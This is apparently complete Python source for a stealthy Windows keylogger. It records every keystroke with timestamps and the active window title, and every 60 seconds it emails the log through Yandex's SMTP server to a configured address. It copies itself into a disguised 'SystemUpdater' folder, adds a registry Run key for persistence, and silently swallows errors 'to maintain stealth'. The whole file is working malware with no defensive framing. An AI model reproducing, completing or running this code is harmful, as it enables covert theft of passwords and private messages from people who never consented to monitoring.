import os
import shutil
import winreg
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import threading
import keyboard
import sys
import win32gui
from datetime import datetime

# Email configuration
EMAIL_ADDRESS = "youremail@yandex.ru"  # Replace with your Yandex email
EMAIL_PASSWORD = "passwd"     # Application-specific password

# Log storage for keystrokes
log = ""

# Hidden folder to store a copy of the program
HIDE_DIR = os.path.expanduser("~\\AppData\\Local\\SystemUpdater")  # Hidden folder


# --- Functions --- #

def send_email():
    """
    Sends accumulated keystroke logs to the same email address.
    """
    global log
    if log:
        try:
            msg = MIMEMultipart()
            msg['From'] = EMAIL_ADDRESS
            msg['To'] = EMAIL_ADDRESS  # Sender and receiver are the same
            msg['Subject'] = "Keylogger Report"
            msg.attach(MIMEText(log, 'plain', 'utf-8'))

            # Connecting to Yandex SMTP server
            server = smtplib.SMTP_SSL('smtp.yandex.ru', 465)
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg.as_string())
            server.quit()
        except Exception:
            pass  # Suppress all errors to maintain stealth
        log = ""  # Clear the log after sending


def get_active_window():
    """
    Returns the title of the currently active window.
    """
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except Exception:
        return "Unknown"


def record_key(event):
    """
    Captures keystrokes and appends them to the log.
    """
    global log
    active_window = get_active_window()
    if event.event_type == "down":
        key = event.name
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        if len(key) == 1:  # Characters
            log += f"[{timestamp}] ({active_window}): {key}\n"
        else:  # Special keys
            log += f"[{timestamp}] ({active_window}): [{key}]\n"


def schedule_email():
    """
    Schedules email sending every 60 seconds.
    """
    send_email()
    threading.Timer(60, schedule_email).start()


def add_to_startup(file_path=None):
    """
    Adds the current file to startup via the Windows registry.
    """
    if file_path is None:
        file_path = os.path.abspath(sys.argv[0])
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SystemUpdater", 0, winreg.REG_SZ, file_path)
        winreg.CloseKey(key)
    except Exception:
        pass  # Suppress errors to maintain stealth


def self_copy():
    """
    Copies the current file to a hidden folder and adds it to startup.
    """
    try:
        # Create the hidden folder if it doesn't exist
        if not os.path.exists(HIDE_DIR):
            os.makedirs(HIDE_DIR)

        # Path to the current file
        current_file = os.path.abspath(sys.argv[0])

        # Copy the file to the hidden folder
        new_location = os.path.join(HIDE_DIR, os.path.basename(current_file))
        if not os.path.exists(new_location):
            shutil.copy2(current_file, new_location)
        add_to_startup(new_location)
    except Exception:
        pass  # Suppress errors to maintain stealth


# --- Main Code --- #

if __name__ == "__main__":
    # Copy the program to a hidden folder and add it to startup
    self_copy()

    # Start the keylogger
    schedule_email()  # Schedule email sending
    keyboard.hook(record_key)  # Capture keystrokes
    keyboard.wait()  # Block the main thread
